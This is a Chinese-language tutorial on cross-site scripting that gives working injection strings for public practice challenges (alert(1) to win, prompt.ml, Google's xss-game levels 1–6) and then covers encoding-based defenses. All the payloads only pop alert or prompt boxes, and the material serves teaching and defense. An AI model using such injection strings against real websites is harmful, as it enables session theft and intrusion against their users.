# xss 漏洞攻击与防御
XSS 攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是 JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash 或者甚至是普通的 HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和 cookie 等各种内容。
## 攻击方式
XSS 攻击主要是利用用户输入或其他获取信息的方式（如 URL 参数、 Cookie等）注入恶意指令。
可尝试通过以下小游戏深入理解XSS 的攻击方式：
### [alert(1) to win](https://alf.nu/alert1)

```js
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```
该函数直接将用户输入嵌入 `<script>` 代码块中。 可直接通过输入恶意 js 代码进行攻击。
如：
```js
");alert(1,"
// 最终拼接成：
<script>console.log("");alert(1,"");</script>
```

```js
 "),alert(1)("
 // 最终拼接成：
 <script>console.log(" "),alert(1)("");</script>
```

### [prompt(1) to win](http://prompt.ml/0)

```js
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}       
```
该函数依旧将用户输入直接嵌入 HTML 中，虽然并没有在 `script` 标签中，但直接在用户输入中输入 `script` 标签可直接生效，输入如下：
```js
"><script>prompt(1)</script>
```
生成后的代码为：
```js
<input type="text" value=""><script>prompt(1)</script>">
```

### [xss-game level 1](https://xss-game.appspot.com/level1)
该 level 与以上两个游戏类似，直接将用户输入嵌入 HTML。解决方案也类似：
```js
// input 输入框直接输入以下字符串
<script>alert()</script>
```

### [xss-game level 2](https://xss-game.appspot.com/level2)
该 level 中直接输入 `<script>` 标签无法生效，但是可以利用 `<img>` 的 `onerror` 事件。
```js
<img scr="error" onerror="alert(1)">
```
### [xss-game level 3](https://xss-game.appspot.com/level3)

该 level 中将 URL 参数直接拼接进 HTML 中。
```js
url:https://xss-game.appspot.com/level3/frame#'><script>alert(1)</script>
```

### [xss-game level 4](https://xss-game.appspot.com/level4)

该 level 中将用户输入直接拼接到 `img` 的  `onload` 事件上。
```js
');alert('1
```

### [xss-game level 5](https://xss-game.appspot.com/level5)
```js
URL: https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
```

### [xss-game level 6](https://xss-game.appspot.com/level6)

```js
URL: https://xss-game.appspot.com/level6/frame#//google.com/jsapi?callback=alert
```
## 防御手段

### HtmlEncode
将需要直接加载到 HTML 内容或者属性上的内容中的 `&<>""/` 进行转义。

### JavaScriptEncode
将需要加载到 js 中的内容除了数字、字母外的所有字符进行十六进制化处理，使得浏览器最终输出结果上是一样的，但能够防止注入的JavaScript执行。

### CSSEncode
当输入的变量出现在`<style>`标签内或其它css的执行环境中时，XSS的注入和防御原理同JavaScript。在此不累述了。
css中xss的注入，在现在的浏览器中基本已经被禁止了，因此也比较少见。

### URLEncode
当输入的内容需要添加在在url跳转地址中时。采用对$var变量进行URLEncode的方法。URLEncode的作用是将字符转化为%HH的形式，支持的转换举例如下：

```js
空格 --> %20
< --> %3c
> --> %3e
```

## 参考资料
1. [XSS攻击 - 维基百科](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC)
2. [前端安全系列（一）：如何防止XSS攻击？](https://tech.meituan.com/fe_security.html)
3. [跨站脚本攻击(Cross-site scripting)](https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting)
4. [4类防御XSS的有效方法](https://www.jianshu.com/p/599fcd03fd3b)
5. [白帽子讲Web安全](https://book.douban.com/subject/10546925/)